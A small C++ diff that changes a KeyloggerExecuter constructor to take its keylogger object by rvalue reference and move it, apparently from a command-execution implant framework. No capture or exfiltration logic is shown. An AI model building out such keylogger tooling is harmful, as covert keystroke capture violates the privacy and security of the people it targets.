@@ -18,7 +18,7 @@ class KeyloggerExecuter
 {
 public:
     KeyloggerExecuter(tag_t tag,
-                      methods::keylogger::Keylogger keylogger)
+                      methods::keylogger::Keylogger&& keylogger)
         : ICommandExecuter(tag),
           m_keylogger(std::move(keylogger))
     {}
